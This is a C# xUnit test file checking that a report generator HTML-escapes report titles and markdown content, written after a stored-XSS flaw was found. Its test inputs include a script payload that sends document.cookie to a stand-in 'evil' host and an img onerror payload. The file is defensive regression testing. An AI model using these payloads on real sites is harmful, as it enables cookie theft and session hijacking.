using System;
using System.Threading.Tasks;
using HQ.Models;
using HQ.Models.Interfaces;
using HQ.Plugins.ReportGenerator;
using HQ.Plugins.ReportGenerator.Models;
using Moq;
using Xunit;

namespace HQ.Plugins.Tests.ReportGenerator;

/// <summary>
/// WP6A-10: markdown and report title were rendered into the generated HTML report with no
/// escaping — raw HTML in `content` passed straight through (Markdig built with
/// UseAdvancedExtensions and no DisableHtml), and `title` was interpolated raw into
/// &lt;title&gt;/&lt;h1&gt;. That is a stored-XSS payload landing in the generated file
/// whenever it is served or opened. These tests pin the fix: raw HTML must not survive
/// into the rendered report, and the title must be HTML-encoded.
/// </summary>
public class ReportGeneratorSecurityTests
{
    private static readonly LogDelegate TestLogger = (level, message, exception) => Task.CompletedTask;

    private ReportGeneratorCommand CreateCommandWithProvider(Mock<IFileStorageProvider> mockProvider)
    {
        var command = new ReportGeneratorCommand();
        command.Logger = TestLogger;
        ((ICommand)command).SetFileStorageProvider(mockProvider.Object);
        return command;
    }

    [Fact]
    public async Task GenerateReport_Html_EscapesMaliciousTitle()
    {
        // Arrange
        string capturedContent = null;
        var mockProvider = new Mock<IFileStorageProvider>();
        mockProvider.Setup(p => p.WriteFileAsync(It.Is<string>(s => s.EndsWith(".html")), It.IsAny<string>(), false))
            .Callback<string, string, bool>((path, content, isBase64) => capturedContent = content)
            .ReturnsAsync((string path, string content, bool isBase64) => path);
        mockProvider.Setup(p => p.WriteFileAsync(It.Is<string>(s => s.Contains(".report-index.json")), It.IsAny<string>(), false))
            .ReturnsAsync((string path, string content, bool isBase64) => path);
        mockProvider.Setup(p => p.ReadFileAsync(It.Is<string>(s => s.Contains(".report-index.json"))))
            .ReturnsAsync((string)null);

        var command = CreateCommandWithProvider(mockProvider);
        var config = new ServiceConfig { Name = "Test" };
        var request = new GenerateReportArgs
        {
            Title = "</title><script>fetch('//evil/?c='+document.cookie)</script>",
            Content = "Hello",
            Format = "html"
        };

        // Act
        await command.GenerateReport(config, request);

        // Assert — the raw </title> and <script> from an attacker-controlled title must not
        // survive into the emitted document.
        Assert.NotNull(capturedContent);
        Assert.DoesNotContain("<script>", capturedContent, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("</title><script>", capturedContent, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task GenerateReport_Html_DisablesRawHtmlInMarkdownContent()
    {
        // Arrange
        string capturedContent = null;
        var mockProvider = new Mock<IFileStorageProvider>();
        mockProvider.Setup(p => p.WriteFileAsync(It.Is<string>(s => s.EndsWith(".html")), It.IsAny<string>(), false))
            .Callback<string, string, bool>((path, content, isBase64) => capturedContent = content)
            .ReturnsAsync((string path, string content, bool isBase64) => path);
        mockProvider.Setup(p => p.WriteFileAsync(It.Is<string>(s => s.Contains(".report-index.json")), It.IsAny<string>(), false))
            .ReturnsAsync((string path, string content, bool isBase64) => path);
        mockProvider.Setup(p => p.ReadFileAsync(It.Is<string>(s => s.Contains(".report-index.json"))))
            .ReturnsAsync((string)null);

        var command = CreateCommandWithProvider(mockProvider);
        var config = new ServiceConfig { Name = "Test" };
        var request = new GenerateReportArgs
        {
            Title = "Safe Title",
            Content = "<img src=x onerror=alert(document.cookie)>",
            Format = "html"
        };

        // Act
        await command.GenerateReport(config, request);

        // Assert — raw HTML embedded in markdown content must not pass through unescaped.
        Assert.NotNull(capturedContent);
        Assert.DoesNotContain("<img src=x onerror=", capturedContent, StringComparison.OrdinalIgnoreCase);
    }
}
